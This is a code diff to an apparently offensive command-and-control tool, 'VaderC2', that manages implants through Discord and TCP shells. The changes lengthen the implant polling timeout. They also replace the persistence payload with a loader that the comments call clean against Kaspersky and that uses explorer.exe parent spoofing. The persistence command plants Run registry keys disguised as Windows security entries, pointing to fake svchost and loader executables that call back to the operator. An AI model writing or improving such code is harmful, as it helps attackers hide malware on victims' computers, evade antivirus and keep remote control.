@@ -650,13 +650,14 @@ class VaderC2:
                     print(f"  {RED}[!] Failed to send command to Discord{RST}")
                     continue
 
-                output = self.poll_discord_output(s.id, timeout=30)
+                output = self.poll_discord_output(s.id, timeout=90)
                 if output:
                     print(output)
                     self.log_event("output_recv", s.id, output)
                     s.last_seen = datetime.now()
                 else:
-                    print(f"  {AMBER}[*] No response within 30s — implant may be offline{RST}")
+                    print(f"  {AMBER}[*] No response within 90s — beacon may be slow or offline{RST}")
+                    print(f"  {DIM}    Try again — Discord polling interval can lag 30-60s{RST}")
 
         except KeyboardInterrupt:
             print(f"\n  {MUTED}[*] Returning...{RST}")
@@ -1142,21 +1143,22 @@ setInterval(grab,{interval*1000});
                         print(f"  {RED}[!] No session available.{RST}")
                     else:
                         if not self.deployed_this_session:
-                            print(f"  {AMBER}[!] WARNING: 'deploy' not run this session.{RST}")
-                            print(f"  {AMBER}    Persist assumes vader_shell.exe has C2 IP baked in (Fresh Build).{RST}")
-                            print(f"  {AMBER}    If the binary on target is OLD, run 'deploy' first.{RST}")
+                            print(f"  {AMBER}[!] Run 'deploy' first to push ghost_loader.exe to target.{RST}")
+                        # ghost_loader_v3 = CLEAN vs KAV — persists TCP shell via explorer.exe parent spoof
+                        # vader_shell.exe is quarantined — never use it for persistence
                         persist_cmd = (
                             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                             '/v WindowsSecurityHealth /t REG_SZ '
                             '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
                             'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
                             '/v WindowsSecurityUpdate /t REG_SZ '
-                            '/d "C:\\Users\\Public\\vader_shell.exe" /f'
+                            '/d "C:\\Users\\Public\\ghost_loader.exe" /f'
                         )
                         if self.send_to_session(s, persist_cmd):
                             print(f"  {GREEN}[+] Persistence set via {s.channel}:{RST}")
-                            print(f"  {GREEN}    WindowsSecurityHealth  → Discord implant{RST}")
-                            print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell (C2 IP baked in at compile){RST}")
+                            print(f"  {GREEN}    WindowsSecurityHealth  → Discord beacon (svchost_update.exe){RST}")
+                            print(f"  {GREEN}    WindowsSecurityUpdate  → TCP shell via ghost_loader_v3 (KAV-clean){RST}")
+                            print(f"  {DIM}    Both fire on next login — TCP shell calls back to baked C2 IP{RST}")
                         else:
                             print(f"  {RED}[!] Send failed{RST}")
 
